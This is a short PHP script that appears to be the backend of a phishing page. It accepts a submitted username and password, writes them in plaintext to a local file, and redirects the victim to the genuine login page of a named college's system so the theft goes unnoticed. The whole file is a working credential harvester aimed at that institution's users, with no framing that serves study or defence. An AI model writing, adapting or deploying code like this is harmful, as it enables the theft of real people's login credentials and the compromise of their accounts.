<?php
// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the username and password from the form
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    // Check if both fields are filled
    if (empty($username) || empty($password)) {
        die("Username and password are required.");
    }

    // Open the file in append mode
    $file = fopen("usernames.txt", "a");
    if (!$file) {
        die("Unable to open file.");
    }

    // Write the username and password to the file
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fwrite($file, "-------------------------\n");

    // Close the file
    fclose($file);

    // Redirect the user to a success page or another website
    header("Location: https://ams.americancollege.edu.in/ams/index.php");
    exit();
} else {
    // If the form is not submitted, redirect to the form page
    header("Location: https://ams.americancollege.edu.in/ams/index.php");
    exit();
}
?>